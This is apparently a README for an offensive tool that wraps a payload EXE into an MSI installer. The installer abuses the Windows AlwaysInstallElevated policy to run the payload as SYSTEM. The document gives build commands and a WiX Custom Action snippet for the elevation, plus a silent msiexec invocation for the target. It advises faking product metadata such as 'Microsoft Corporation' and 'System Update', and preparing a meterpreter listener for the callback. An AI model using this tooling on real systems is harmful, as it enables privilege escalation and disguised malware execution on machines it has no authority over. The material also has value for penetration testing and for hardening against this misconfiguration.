# MSI builder — AlwaysInstallElevated

Wraps an EXE (e.g. one built by `loader/build_loader.py`) into an MSI that
runs the payload **during installation** as a Custom Action with
`Execute="deferred"` + `Impersonate="no"`. When the target has the
`AlwaysInstallElevated` policy enabled, the MSI installer executes the
Custom Action as **NT AUTHORITY\\SYSTEM**, giving you a SYSTEM-level
execution of the embedded EXE without ever needing admin to call `msiexec`.

## Prerequisites (build host, Linux)

```
sudo apt install msitools
```

This provides `wixl`, a Linux-native WiX compiler.

## Prerequisites (target, Windows)

Both registry keys must be set to `1`:

```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If either is missing or `0`, the installer runs only with the user's
privileges — no elevation.

Check quickly on target:

```
powershell -c "Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\Installer','HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue"
```

## Build

```
python3 build_msi.py --exe ../loader/WindowsUpdate.exe -o update.msi
```

With custom metadata:

```
python3 build_msi.py \
    --exe ./payload.exe \
    --product-name "Corporate Toolkit" \
    --manufacturer "IT Services" \
    -o corporate_toolkit.msi
```

Options:

| Flag | Meaning |
|------|---------|
| `--exe` | EXE embedded into the MSI Binary table (required) |
| `-o/--output` | Output `.msi` path (default `installer.msi`) |
| `--product-name` | `Name` attribute in the Product row (default `System Update`) |
| `--manufacturer` | `Manufacturer` attribute (default `Microsoft Corporation`) |
| `--keep-wxs` | Keep the generated `.wxs` source for inspection |

## Run on target

Copy the MSI to the target, then:

```
msiexec /quiet /qn /i C:\Users\Public\update.msi
```

- `/quiet /qn` — no UI, no prompts.
- `/i` — install mode (triggers the deferred Custom Action).

With `AlwaysInstallElevated` set, the Custom Action executes as SYSTEM.
The EXE is launched `asyncNoWait` so the installer returns immediately —
your payload's callback (meterpreter, etc.) should be ready on the
listener before you invoke `msiexec`.

## How it works (WiX)

The generated `.wxs` embeds the EXE into the `Binary` table and schedules
a single Custom Action after `InstallInitialize`:

```xml
<Binary Id="payload" SourceFile="..." />

<CustomAction Id="RunPayload"
              BinaryKey="payload"
              ExeCommand=""
              Execute="deferred"
              Impersonate="no"
              Return="asyncNoWait" />

<InstallExecuteSequence>
    <Custom Action="RunPayload" After="InstallInitialize" />
</InstallExecuteSequence>
```

- `Execute="deferred"` — runs in the installer's server process.
- `Impersonate="no"` — don't impersonate the installing user; run as the
  installer account. Under `AlwaysInstallElevated` that's SYSTEM.
- `Return="asyncNoWait"` — don't block the installer on the payload,
  avoids hanging `msiexec` if the shellcode blocks on a socket.

No files are written to disk by the installer itself — the payload is
unpacked from the Binary table directly to a temp file and executed.

## Troubleshooting

- **Installer exits with `1603`** — Custom Action failed. Usually means
  `AlwaysInstallElevated` is NOT set on both hives, or the EXE itself
  errored. Test the EXE manually first.
- **No callback, no error** — your payload is crashing after launch.
  Re-test the EXE standalone under the same user context.
- **`wixl: command not found`** — install `msitools`.
